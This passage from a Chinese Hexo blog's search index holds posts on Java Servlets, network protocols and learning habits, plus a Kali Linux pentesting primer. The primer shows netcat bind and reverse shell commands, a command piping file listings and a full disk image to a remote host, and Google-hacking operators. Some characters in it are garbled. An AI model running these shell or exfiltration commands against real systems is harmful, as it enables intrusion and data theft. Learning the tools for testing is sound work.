1.在使用对象时，使用带有协议的请求和响应对象HttpServletRequset和HttpServletResponse 2.在开发时，继承HttpServlet是，直接重写doGet和doPost方法，而不是重写service方法了 实现Servlet的虚拟路径映射 1.Servlet的多重映射：一个Servlet，可以对应多个访问路径。比如：一个servlet对应的访问路径：/testo2或者/testo3 2.Servlet的映射路径可以使用通配符servlet的映射路径有三种方式：、完全目录匹配：比如/hello目录匹配：比如/abc/或者/扩展名匹配：.do，.action 注意/*.do这种写法是错误的。优先级：完全目录匹配&gt;目录匹配&gt;扩展名匹配 3.缺省Servlet什么是缺省Servlet：它的映射路径“/”，代表这是一个缺省的servlet.缺省的servelt作用：处理请求的资源找不到的问题（404代表请求的资源找不到） ServletConfig接口什么是servletConfig：它是servlet的配置对象，作用就是获取与servlet的初始化参数。它的子类是GenericServlet和HttpServlet.它被实列化通过web服务器实现的。得到servletconfig对象：getServletConfig（） ServletConfig常用的方法： 1.获取servlet的初始化参数的值：getInitParameter（String name） 2.获取servlet初始化参数的名称：getInitParameterNames（） 3.得到servletContext对象：getServletContext（） 4.获取servlet的名称：getservletName（） ServletContext接口ServletContext对象是在web服务器启动时就创建了，是web服务器创建的servletcontext对象，每一个web项目只有一个ServletContext对象。ServletContext对象的作用：获取web应用程序的初始化参数，在web应用程序能共享数据，获取web项目下的资源文件。得到ServletContext对象： 1.通过ServletConfig对象：config.getservletContext（） 2.直接得到：getservletContext（）；获取web应用程序的初始化参数（web应用程序就是web项目） 1.获取全局初始化参数的值：getInitParameter（String name）： 2.获取全局初始化参数的名称：getInitParameterNames（） 3.获取Web下面的资源文件 通过Servletcontext对象能够获取Web项目下面文件的字节输入流，或者文件的绝对路径。 路径问题： 普通java项目：直接使用jdk编译java文件，所以说文件的路径是相对于工作空间。 web项目：运行在tomcat服务器上面的，所有说文件的路径是相对于tomcat服务器。服务器端是没有src这个目录，写路径不能写src，必须相对于tomcat服务器端的路经。1.获取文件的自己输入流：路径是相对于tomcat服务器的路径Inputstream in =getResourceAsStream（String path）2.获取文件的绝对路径：路径是相对于服务器端的路径String realPath=getRealPath（path）]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>java web</tag>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络协议深入浅出]]></title>
    <url>%2F%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%2F</url>
    <content type="text"><![CDATA[计算机网络概述 第一章 物理层数据链路层网络层ICMP 网际控制报文协议总结 ICMP相当于网络世界的侦察兵。刘超老师讲了两种类型的ICMP报文，一种是主动探查的查询报文，一种异常报告的差错报文； ping使用查询报文，Traceroute使用差错报文。 ICMP 差错报告报文好多，简单列举下：点不可达为3，源抑制为4，超时为11，重定向为5，参数问题12 终点不可达 网络不可达 主机不可达 协议不可达 端口不可达 需要进行分片但设置了不分片位 源站抑制时间超时路由重定向参数问题ICMP 查询报文类型8||0 回送或回答，13||14 时间戳请求或回答 对ping的主动请求，进行网络抓包，称为ICMP ECHO REQUEST。同理主动请求的回复，称为ICMP ECHO REPLY。比起原生的ICMP，这里面多了两个字段，一个是标识符。在选项数据中，ping还会存放发送请求的时间值，来计算往返时间，说明路程的长短。 Traceroute：差错报文类型的使用 Traceroute的第一个作用就是故意设置特殊的TTL，来追踪去往目的地时沿途经过的路由器。 怎么知道UDP有没有到达目的主机呢？ Traceroute程序会发送一份UDP数据报给目的主机，但它会选择一个不可能的值作为UDP端口号（大于30000）。当该数据报到达时，将使目的主机的 UDP模块产生一份“端口不可达”错误ICMP报文。如果数据报没有到达，则可能是超时。 Traceroute还有一个作用是故意设置不分片，从而确定路径的MTU。 问题 当发送的报文出问题的时候，会发送一个ICMP的差错报文来报告错误，但是如果ICMP的差错报文也出问题了呢？ 解答： 这一节只说了一个局域网互相ping的情况。如果跨路由器、跨网关的过程会是什么样的呢？ 解答： 当路由器利用 IP 数据报首部中的“首部检验和”字段检测出在传输过程中出现了差错时，就简单地将其丢弃。为什么不发送一个 ICMP 报文给源主机呢？ 解答： IP 协议并不要求源主机重传有差错的 IP 数据报 保证无差错传输是由 TCP 协议完成的。另一方面，首部检验和只能检验出 IP 数据报的首部是否出现差错，但不知道首部中的源地址字段有没有出错。如果源地址出现了差错，那么将这种 IP 数据报传送到错误的地址也是没有任何意义的 路由协议总结 路由分静态路由和动态路由，静态路由可以配置复杂的策略路由，控制转发策略； 动态路由主流算法有两种，距离矢量算法和链路状态算法。基于两种算法产生两种协议，BGP协议和OSPF协议。 动态路由算法1、距离矢量路由算法，它是基于Bellman-Ford算法的。 这种算法的基本思路是，每个路由器都保存一个路由表，包含多行，每行对应网络中的一个路由器，每一行包含两部分信息，一个是要到目标路由器，从那条线出去，另一个是到目标路由器的距离。 缺点： 第一个问题就是好消息传得快，坏消息传得慢。 第二个问题是，每次发送的时候，要发送整个全局路由表。 2、链路状态路由算法，基于Dijkstra算法。 这种算法的基本思路是：当一个路由器启动的时候，首先是发现邻居，向邻居say hello，邻居都回复。然后计算和邻居的距离，发送一个echo，要求马上返回，除以二就是距离。然后将自己和邻居之间的链路状态包广播出去，发送到整个网络的每个路由器。这样每个路由器都能够收到它和邻居之间的关系的信息。因而，每个路由器都能在自己本地构建一个完整的图，然后针对这个图使用Dijkstra算法，找到两点之间的最短路径。 动态路由协议1、基于链路状态路由算法的OSPF OSPF（Open Shortest Path First，开放式最短路径优先）就是这样一个基于链路状态路由协议，广泛应用在数据中心中的协议。由于主要用在数据中心内部，用于路由决策，因而称为内部网关协议（Interior Gateway Protocol，简称IGP）。 内部网关协议的重点就是找到最短的路径。在一个组织内部，路径最短往往最优。当然有时候OSPF可以发现多个最短的路径，可以在这多个路径中进行负载均衡，这常常被称为等价路由。 2、基于距离矢量路由算法的BGP 但是外网的路由协议，也即国家之间的，又有所不同。我们称为外网路由协议（Border Gateway Protocol，简称BGP）。 BGP又分为两类：eBGP和iBGP。自治系统间，边界路由器之间使用eBGP广播路由。内部网络也需要访问其他的自治系统。边界路由器如何将BGP学习到的路由导入到内部网络呢？就是通过运行iBGP，使得内部的路由器能够找到到达外网目的地的最好的边界路由器。 自治系统 Stub AS：对外只有一个连接。这类AS不会传输其他AS的包。例如，个人或者小公司的网络。 Multihomed AS：可能有多个连接连到其他的AS，但是大多拒绝帮其他的AS传输包。例如一些大公司的网络。 Transit AS：有多个连接连到其他的AS，并且可以帮助其他的AS传输包。例如主干网。 每个自治系统都有边界路由器，通过它和外面的世界建立联系。 问题1、路由协议要在路由器之间交换信息，这些信息的交换还需要走路由吗？不是死锁了吗？ 解答： 2、路由器之间信息的交换使用什么协议呢？报文格式是什么样呢？ 解答： 运输层应用层TCP 协议总结 TCP包头很复杂，但是主要关注五个问题，顺序问题，丢包问题，连接维护，流量控制，拥塞控制； 连接的建立是经过三次握手，断开的时候四次挥手，一定要掌握的我画的那个状态图。 顺序问题、丢包问题、流量控制都是通过滑动窗口来解决的，这其实就相当于你领导和你的工作备忘录，布置过的工作要有编号，干完了有反馈，活不能派太多，也不能太少； 拥塞控制是通过拥塞窗口来解决的，相当于往管道里面倒水，快了容易溢出，慢了浪费带宽，要摸着石头过河，找到最优值。 TCP包头格式 TCP状态机 三次握手状态时序图 四次挥手状态时序图 问题 TCP的连接有这么多的状态，你知道如何在系统中查看某个连接的状态吗？ 这一节仅仅讲了连接维护问题，其实为了维护连接的状态，还有其他的数据结构来处理其他的四个问题，那你知道是什么吗？ TCP的BBR听起来很牛，你知道他是如何达到这个最优点的嘛？ 答：S1：慢启动开始时，以前期的延迟时间为延迟最小值Tmin。然后监控延迟值是否达到Tmin的n倍，达到这个阀值后，判断带宽已经消耗尽且使用了一定的缓存，进入排空阶段。S2：指数降低发送速率，直至延迟不再降低。这个过程的原理同S1S3：协议进入稳定运行状态。交替探测带宽和延迟，且大多数时间下都处于带宽探测阶段。 学会了UDP和TCP，你知道如何基于这两种协议写程序吗？这样的程序会有什么坑呢？ UDP协议总结 如果将TCP比作成熟的社会人，UDP则是头脑简单的小朋友。TCP复杂，UDP简单；TCP维护连接，UDP谁都相信；TCP会坚持知进退；UDP愣头青一个，勇往直前； UDP虽然简单，但它有简单的用法。它可以用在环境简单、需要多播、应用层自己控制传输的地方。例如DHCP、VXLAN、QUIC等。 UDP包头 问题 都说TCP是面向连接的，在计算机看来，怎么样才算一个连接呢？ 你知道TCP的连接是如何建立，又是如何关闭的吗？]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高效学习之反思]]></title>
    <url>%2F%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E6%80%9D%2F</url>
    <content type="text"><![CDATA[摘要大部分人都认为自己爱学习，但是： 他们都是只有意识没有行动，他们是动力不足的人。 他们都不知道自己该学什么，他们缺乏方向和目标。 他们都不具备自主学习的能力，没有正确的方法和技能。 更要命的是，他们缺乏实践和坚持。 挑选知识和信息源！注重基础知识和原理上的学习！使用知识图—联想！ 主动学习和被动学习人的学习分为「被动学习」和「主动学习」两个层次。 被动学习：如听讲、阅读、试听、演示，学习内容的平均留存率为 5%、10%、20% 和 30%。 主动学习：如通过讨论、实践、教授给他人，会将原来被动学习的内容留存率从 5% 提升到 50%、75% 和 90%。 浅度学习和深度学习 这些所谓的“快餐文化”可以让你有短暂的满足感，但是无法让你有更深层次的思考和把知识转换成自己的技能的有效路径，因为那些都是需要大量时间和精力的付出，不符合现代人的生活节奏。人们开始在朋友圈、公众号、得到等这样的地方进行学习，导致他们越学越焦虑，越学越浮燥，越学越不会思考。于是，他们成了“什么都懂，但依然过不好这一生”的状态。 怎样进行深度学习 高质量的信息源和第一手的知识。 把知识连成地图，将自己的理解反述出来。 不断地反思和思辨，与不同年龄段的人讨论。 举一反三，并践行之，把知识转换成技能学习有三个步骤 知识采集。信息源是非常重要的，获取信息源头、破解表面信息的内在本质、多方数据印证，是这个步骤的关键。 知识缝合。所谓缝合就是把信息组织起来，成为结构体的知识。这里，连接记忆，逻辑推理，知识梳理是很重要的三部分。 技能转换。通过举一反三、实践和练习，以及传授教导，把知识转化成自己的技能。这种技能可以让你进入更高的阶层。 系统地学习—-学习模板1、这个技术出现的背景、初衷和要达到什么样的目标或是要解决什么样的问题。这个问题非常关键，也就是说，你在学习一个技术的时候，需要知道这个技术的成因和目标，也就是这个技术的灵魂。如果不知道这些的话，那么你会看不懂这个技术的一些设计理念。 2、这个技术的优势和劣势分别是什么，或者说，这个技术的 trade-off 是什么。任何技术都有其好坏，在解决一个问题的时候，也会带来新的问题。另外，一般来说，任何设计都有 trade-off（要什么和不要什么），所以，你要清楚这个技术的优势和劣势，以及带来的挑战。 3、这个技术适用的场景。任何技术都有其适用的场景，离开了这个场景，这个技术可能会有很多槽点，所以学习技术不但要知道这个技术是什么，还要知道其适用的场景。没有任何一个技术是普适的。注意，所谓场景一般分别两个，一个是业务场景，一个是技术场景。 4、技术的组成部分和关键点。这是技术的核心思想和核心组件了，也是这个技术的灵魂所在了。学习技术的核心部分是快速掌握的关键。 5、技术的底层原理和关键实现。任何一个技术都有其底层的关键基础技术，这些关键技术很有可能也是其它技术的关键基础技术。所以，学习这些关键的基础底层技术，可以让你未来很快地掌握其它技术。可以参看我在 CoolShell 上写的 Docker 底层技术那一系列文章。 6、已有的实现和它之间的对比。一般来说，任何一个技术都会有不同的实现，不同的实现都会有不同的侧重。学习不同的实现，可以让你得到不同的想法和思路，对于开阔思维，深入细节是非常重要的。 举一反三总结和归纳 学习的开始阶段，可以不急于总结归纳，不急于下判断，做结论，而应该保留部分知识的不确定性，保持对知识的开放状态。 当对整个知识的理解更深入，自己站的位置更高以后，总结和归纳才会更有条理。 总结一下做总结归纳的方法：把你看到和学习到的信息，归整好，排列好，关联好，总之把信息碎片给结构化掉，然后在结构化的信息中，找到规律，找到相通之处，找到共同之处，进行简化、归纳和总结，最终形成一种套路，一种模式，一种通用方法 训练自己这方面的能力，需要多看一些经典的方法论图书 实践出真知《Effective C++》和《More Effective C++》左耳朵大叔看了十多年，书中的很多章节我都可以背出来，但是我想得到的不是这些知识，而是这种思维方式，这需要我去做很多的编程工作才能真正明白，才会有斯科特·迈耶斯（Scott Meyers）那样的思维方式，这才是最宝贵的。 坚持不懈ARTS 的活动：每人每周写一个 ARTS：Algorithm 是一道算法题，Review 是读一篇英文文章，Technique/Tips 是分享一个小技术，Share 是分享一个观点。我希望大家可以坚持一年，但是我也相信，能够坚持下来的人一定很少，绝大多数人都是虎头蛇尾的，但是我依然相信会有人坚持下来的。 坚持也不是要苦苦地坚持，有循环有成就感的坚持才是真正可以持续的。所以，一方面你要把你的坚持形成成果晒出来，让别人来给你点赞，另一方面，你还要把坚持变成一种习惯，就像吃饭喝水一样，你感觉不到太多的成本付出。只有做到这两点，你才能够真正坚持。 软件的代码是由哪些部分构成的eg: 接口抽象定义。任何代码都会有很多接口或抽象定义，其描述了代码需要处理的数据结构或者业务实体，以及它们之间的关系，理清楚这些关系是非常重要的。 模块粘合层。我们的代码有很多都是用来粘合代码的，比如中间件（middleware）、Promises 模式、回调（Callback）、代理委托、依赖注入等。这些代码模块间的粘合技术是非常重要的，因为它们会把本来平铺直述的代码给分裂开来，让你不容易看明白它们的关系。 业务流程。这是代码运行的过程。一开始，我们不要进入细节，但需要在高层搞清楚整个业务的流程是什么样的，在这个流程中，数据是怎么被传递和处理的。一般来说，我们需要画程序流程图或者时序处理图。 具体实现。了解上述的三个方面的内容，相信你对整个代码的框架和逻辑已经有了总体认识。这个时候，你就可以深入细节，开始阅读具体实现的代码了。对于代码的具体实现，一般来说，你需要知道下面一些事实，这样有助于你在阅读代码时找到重点。 代码逻辑。代码有两种逻辑，一种是业务逻辑，这种逻辑是真正的业务处理逻辑；另一种是控制逻辑，这种逻辑只是用控制程序流转的，不是业务逻辑。比如：flag 之类的控制变量，多线程处理的代码，异步控制的代码，远程通讯的代码，对象序列化反序列化的代码等。这两种逻辑你要分开，很多代码之所以混乱就是把这两种逻辑混在一起了（详情参看《编程范式游记》）。 出错处理。根据 2：8 原则，20% 的代码是正常的逻辑，80% 的代码是在处理各种错误，所以，你在读代码的时候，完全可以把处理错误的代码全部删除掉，这样就会留下比较干净和简单的正常逻辑的代码。排除干扰因素，可以更高效地读代码。 数据处理。只要你认真观察，就会发现，我们好多代码就是在那里倒腾数据。比如 DAO、DTO，比如 JSON、XML，这些代码冗长无聊，不是主要逻辑，可以不理。 重要的算法。一般来说，我们的代码里会有很多重要的算法，我说的并不一定是什么排序或是搜索算法，可能会是一些其它的核心算法，比如一些索引表的算法，全局唯一 ID 的算法，信息推荐的算法、统计算法、通读算法（如 Gossip）等。这些比较核心的算法可能会非常难读，但它们往往是最有技术含量的部分。 底层交互。有一些代码是和底层系统的交互，一般来说是和操作系统或是 JVM 的交互。因此，读这些代码通常需要一定的底层技术知识，不然，很难读懂。 运行时调试。很多时候，代码只有运行起来了，才能知道具体发生了什么事，所以，我们让代码运行进来，然后用日志也好，debug 设置断点跟踪也好。实际看一下代码的运行过程，是了解代码的一种很好的方式。 阅读代码的方法 一般采用自顶向下，从总体到细节的“剥洋葱皮”的读法。 画图是必要的，程序流程图，调用时序图，模块组织图…… 代码逻辑归一下类，排除杂音，主要逻辑才会更清楚。 debug 跟踪一下代码是了解代码在执行中发生了什么的最好方式。 反思]]></content>
      <categories>
        <category>高效学习</category>
      </categories>
      <tags>
        <tag>高效学习</tag>
        <tag>左耳朵大叔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali-linux渗透测试入门]]></title>
    <url>%2Fkali-linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[信息收集Google Hacking Databasehttps://www.exploit-db.com/google-hacking-database/ 《Goole Hacking For Penetration Testers》 《Google Hacking 渗透性测试者的利剑》Google 基本搜索语法1、关键字不区分大小写2、使用默认AND逻辑搜索3、默认最多32个单词4、用 + 号，强制带后面的单词搜索5、| 或者 OR ，匹配多个关键字的任一个6、混合用多种布尔操作时，将从左到右的顺序执行7、默认下忽视关键字中部分常用单词8、Google 使用网页搜索，定义互联网9、Google 会智能地保存一些内容，比如一些过时的词，一些不适合呈现的内容10、布尔操作符：AND(+) NOT(-) OR(|),现在不需要，google会自动匹配Google 高级搜索语法基本使用与语法 operatio：search_termoperatio 搜索命令search_term 关键字搜索1、intext匹配网页正文中含有的关键字．可接多个关键字，空格或者逗号分隔；2、allintext和index类似，能接多个关踺字，能与其他操作符混合使用，可单独使用。3、intitle搜索网页标题中是否有所输入字符，可单独使用，可混合其他命令用；4、allintitle类似血itle，能接多个关键字，不能与其他操作符混合使用5、cache输入U心，，搜索特定页面的缓存快照，回查网页副本；6、define返回搜索关键字的定义：7、filetype搜索指定类型的文件，可以与其他操作符混合使用8、ext与filee等价9、info搜絷输入URL的摘要信息和其他相关信息，该操作符不能与其他作符及关键字混用；10、inurl搜索输入字符是否存在于U中；11、allinurl类似inurl，可指定多个字符，不能与其他憬作符混合使用，可单独使用；12、link搜索链接到所输入URL的页面，该亻乍符不需要关键字，不能与其他操作符及关键字混用；13、site搜索范围缩小到特定的网站，域或子域；14、related接一个URL，搜索与该URL相关的页面，该作符不能与其他悍作符及关键字混用；15、numrange接数字范围，用一个减号两边接数字来表示。减号左边为最小值，右边为最大值，从而搜索数字；16、inanchor搜索一个HTML标记中的一个链接的文本表现形式，闞在链接文本中搜索冒号后紧接的一个关键字；17、insubject搜索Google组的标题行；18、daterange搜索某个日期范围内GoogIe做索引的网页。 工具：NETCAT-NC 网络工具中的踹士军刀一一小身材、大智慧 侦昕模式/传输模式 telnet/获取bannerfä,a 传输文本信息 传输文件/§录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 TELNET / BANNERman -c ：man 手册的缩写 nc -h[v1.10-41.1]connect to somewhere: nc [-options] hostname port[s] [ports] …listen for inbound: nc -l -p port [-options] [hostname] [port]options: -c shell commands as `-e’; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts -g gateway source-routing hop point[s], up to 8 -G num source-routing pointer: 4, 8, 12, … -h this cruft -i secs delay interval for lines sent, ports scanned -k set keepalive option on socket -l listen mode, for inbound connects -n numeric-only IP addresses, no DNS -o file hex dump of traffic -p port local port number -r randomize local and remote ports -q secs quit after EOF on stdin and delay of secs -s addr local source address -T tos set Type Of Service -t answer TELNET negotiation -u UDP mode -v verbose [use twice to be more verbose] -w secs timeout for connects and final net reads -C Send CRLF as line-ending -z zero-I/O mode [used for scanning]port numbers can be individual or ranges: lo-hi [inclusive];hyphens in port names must be backslash escaped (e.g. ‘ftp-data’). eg： nc -vn远程电子取证的收集PS：| 管道eg: ls -l | nc -nv 10.1.1.XX XXXX将当前电脑的文件信息 利用通道 + NC 传输到10.1.1.XX 终端显示出来 传输⽂文件 A：nc -lp 333 &gt; 1.mp4 B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1 或 A：nc -q 1 -lp 333 &lt; a.mp4 B： nc -nv 1.1.1.1 333 &gt; 2.mp4 -q 1：传输完成1s后断开连接-lp：监听端口 传输目录需要结合其他命令 A：tar -cvf - music/ | nc -lp 333 –q 1 B：nc -nv 1.1.1.1 333 | tar -xvf – tar 是unix/linux下的打包器。 -cvf可以看做-c -v -f，-xvf则是-x -v -f。 其中-c/-x分别表示create/extract，即打包/解包。 -v 是verbose，表示显示打包/解包的详细过程。 -f 表示file，表示打包输出/解包输入文件，后面跟”-“表示使用“标准输入/输出”（stdin/stdout)作为输出/输入文件。 “|”表示“重定向” 加密传⽂文件 A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 B： mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1 mcrypt 加解密工具命令 -flush 清空缓冲区 -Fbq 加密参数 -Fbqd 解密参数 流媒体服务 A： cat 1.mp4 | nc -lp 333 B： nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 - B 以流的形式传递给流媒体软件 默认缓存3000 A -lp 333 监听本地333端口端口扫描 nc -nvz 1.1.1.1 1-65535 nc –vnzu 1.1.1.1 1-1024 远程克隆硬盘或者内存 A： nc -lp 333 | dd of=/dev/sda B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1 先克隆内存，再克隆硬盘 为什么要远程取证克隆？而不是直接克隆？ 远程控制正向： A：nc -lp 333 -c bash B：nc 1.1.1.1 333反向： A：nc -lp 333 B：nc 1.1.1.1 333 -c bash 注：Windows⽤用户把bash改成cmd； Nc只能在一定程度上替代ssh；可实现正反向控制（被控制与控制）； -c bash C盘上的bash shell （送给某机器shell、，等待某机器shell） 优秀博客：nc命令用法举例 NCAT Nc缺乏加密和⾝身份验证的能⼒力 Ncat包含于nmap⼯工具包中 A：ncat ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl B：ncat -nv 1.1.1.1 333 –ssl –allow ：允许 –ssl :都采取加密 WIRESHARK最优秀的抓包工具之一，哈哈，该工具仅仅是对抓到的包进行解码分析。 抓包嗅探协议分析 安全专家必备的技能 抓包引擎 Libpcap9—— Linux Winpcap10—— Windows 解码能⼒ 抓包后的软件保存为pcap，兼容性较好 基本使⽤用⽅方法1、启动2、选择抓包⺴⽹网卡3、混杂模式4、实时抓包5、保存和分析捕获⽂文件6、首选项 筛选器 过滤掉干扰的数据包 抓包筛选器 显⽰示筛选器 常⻅见协议包 数据包的分层结构 Arp Icmp Tcp——三次握⼿手 Udp Dns http ftp包内容分层显示 ARPeg:Address ResoIution Protocol（request）Hardware type:Ethernet（1）ProtocoI type:IP（0×e800）Hardware S1Ze：6protocol size:4Sender MAC address：dO：（7：（0：99：ed：3a{de：（7：CO：99：ed：3a）Opcode：操作代码Sender IP address：Sender MAC address：Target MAC address：Target IP address:192·168·1·1（192，168，1，1）61：70：70：69：6e：67亻61：70：70：69：6e：67）192·168·1·105（192．168．1．105） SSDP三层协议，Tim to live : win 128 linux 65 unix 256Type：二层往上三层协议protcool：三层往上四层协议，第四层的网络协议有很多种种类 TCP数据流 http Smtp Pop3 Ssl 信息统计 节点数 协议分布 包⼤大⼩小分布 会话连接 解码⽅方式 专家系统 抓包对⽐比nc、ncat加密与不加密的流量 实践 抓包对⽐比nc、ncat加密与不加密的流量 实践 抓包对⽐比nc、ncat加密与不加密的流量 企业抓包布署⽅方案 Sniffer Cace / riverbed Cascad pilot TCPDUMP——抓包 抓包 tcpdump -i eth0 -s 0 -w file.pcap 读取抓包⽂文件 Tcpdump -r file.pcap 用法： 筛选tcpdump -n -r http.cap | awk ‘{print $3}’| sort –utcpdump -n src host 145.254.160.237 -r http.captcpdump -n dst host 145.254.160.237 -r http.captcpdump -n port 53 -r http.captcpdump -nX port 80 -r http.cap ⾼高级筛选tcpdump -A -n ‘tcp[13] = 24’ -r http.cap 介绍超级详细Tcpdump 的用法抓包工具tcpdump用法说明tcpdump命令tcpdump抓包分析 三种关键字类型 第一种是关于类型的关键字，主要包括host，net，port, 例如 host 210.27.48.2，指明 210.27.48.2是一台主机，net 202.0.0.0 指明 202.0.0.0是一个网络地址，port 23 指明端口号是23。如果没有指定类型，缺省的类型是host. 第二种是确定传输方向的关键字，主要包括src , dst ,dst or src, dst and src ,这些关键字指明了传输的方向。举例说明：src 210.27.48.2 ,指明ip包中源地址是210.27.48.2dst net 202.0.0.0 指明目的网络地址是202.0.0.0如果没有指明方向关键字，则缺省是src or dst关键字 第三种是协议的关键字，主要包括fddi,ip,arp,rarp,tcp,udp等类型。Fddi指明是在FDDI(分布式光纤数据接口网络)上的特定 的网络协议，实际上它是”ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether的包进行处理和 分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。 除了这三种类型的关键字之外，其他重要的关键字如下：gateway, broadcast,less,greater,还有三种逻辑运算，取非运算是 ‘not ‘ ‘! ‘, 与运算是’and’,’&amp;&amp;;或运算 是’or’ ,’||’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要。 1、直接在终端启动tcpdump将监视第一个网络界面上所有流过的数据包2、使用-i参数指定tcpdump监听的网络界面，这在计算机具有多个网络界面时非常有用，3、使用-c参数指定要监听的数据包数量，4、使用-w参数指定将监听到的数据包写入文件中保存 eg：1、抓取回环网口的包：tcpdump -i lo 2、防止包截断：tcpdump -s0 3、以数字显示主机及端口：tcpdump -n A想要截获所有210.27.48.1 的主机收到的和发出的所有的数据包：tcpdump host 210.27.48.1 B想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令：（在命令行中适用 括号时，一定要tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /) C如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：tcpdump ip host 210.27.48.1 and ! 210.27.48.2 D如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：tcpdump tcp port 23 host 210.27.48.1 E对本机的udp 123 端口进行监视 123 为ntp的服务端口 tcpdump udp port 123 F 系统将只对名为hostname的主机的通信数据包进行监视。主机名可以是本地主机，也可以是网络上的任何一台计算机。下面的命令可以读取主机hostname发送的所有数据：tcpdump -i eth0 src host hostname G 下面的命令可以监视所有送到主机hostname的数据包：tcpdump -i eth0 dst host hostname H 我们还可以监视通过指定网关的数据包：tcpdump -i eth0 gateway Gatewayname I 如果你还想监视编址到指定端口的TCP或UDP数据包，那么执行以下命令：tcpdump -i eth0 host hostname and port 80 J 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：tcpdump ip host 210.27.48.1 and ! 210.27.48.2 K 想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令：（在命令行中适用 括号时，一定要tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /) L 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：tcpdump ip host 210.27.48.1 and ! 210.27.48.2 M 如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：tcpdump tcp port 23 host 210.27.48.1 过程文档记录 Dradis 短期临时小团队资源共享 各种插件导入文件 Keepnote Truecrypt DradisDradis 框架是一个开源的协作和报告平台。它是由Ruby开发的一个独立的平台。 参考资料官网What is MagicTree?MagicTree vs. DradisKali Reporting Tools工具推荐：Dradis，Kali渗透测试报告生成器 TruecryptTrueCrypt，是一款免费开源的加密软件，同时支持 Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt 不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持 FAT32 和 NTFS 分区、隐藏卷标、热键启动等。—-百度百科 比较完整的使用教程：TrueCrypt中文教程]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[心态再次变化，低沉]]></title>
    <url>%2F%E5%BF%83%E6%80%81%E5%86%8D%E6%AC%A1%E5%8F%98%E5%8C%96%EF%BC%8C%E4%BD%8E%E6%B2%89%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt U2FsdGVkX1+izXUAQAfhT7BuBTHhpjFdLW2MkRLhMq+p7PfSJHn5pfNNTha5yd7VCJb5Nef9rx38QZ4anJRo303iSNm2Qa12ekLJE+1TVu+ccBt+NKovr2HgnkMwZ108cWbs8TJqPB9te6oKTj3vqnDeHqhRzLVMxPjI+DF5e+DAIJSsI/GaGjP4nNNvUt8FrjQcVmhbbZ61UdRUf/hSLgIYMeF+Ey0tZLGzgj+kvWEqI3dEvnHCs32xSfQ7RIIsY8a5ALz4+3q8vBnHlkf68iENvDohgTEoBFtOYpKfn/Y/oPZEOyqZ7LmxTu8Y97el85HVd5uFC5/oIDLL4BEBIv33AaTiz80IK7ttqhUXW5+rih0/kDjCR2cT7A1OpQMIXHV+c7oTEHR0t+AAVxHYVCM+v3JqKl0VwriuzydrLqTEaCkn9RA2n3T+nH5/zgQvZ0L4lnPwYLntwLT5VwRe1PbrRMuZKCqum6kBUYmjOgvX5n7pRiWvsHYjLGKoOpBlwVBRgIf/OVWmypTjc94UGkxqGmZ/A+rE59f6zGvDhGHw8HAc836J7w4WJpwbfOS+N6RC5llONP4fRDZSiZj/hzdssRa9ObfU/mh/YAMSlM0rCx+lwL+ePqJ4C9XAH7aZC8mXQlhGxFWrB9K2cXrEbYePBWAbdyhBw3r5vcQVgbqQgeFxdeuYqTvySImxUdJSetxvOMiSwNeqmefNqfdSqKkfjBTJhaS92xAYCTojxuK5+RDHLyqhZhTmKDIs9bAwzeYcrjPgs/np+bYSGUhHsBAJHVIyrw067RoDhafDl6XsgrU0Jtu1+ZKNr3vwjVFQH3ZivEjdLfkFFq7I2mttMt70cl5VIVOGzMLQg86nwyTxniGWaaGbx4KwCvLvGXkE6V2T4x6RbXupIrKTmen3v2yaezJ9SB/y9xqgu78/KcGGMwK9+ZDs+TwqQ1hvybwq29roWtHs3NRzdofSlh7ATUZN6hdlabTQ+cnkWXWrKpHHhjRoSsFa5v3tNMLmDkCFyRf6c4c+2dhMx0iLd/tLTSDNvMUt2C4PCBOvx0BoJqOo0eh5tsbaSW8KGOAZGE88CLIgBM3lI1GhtJAuj4r1yww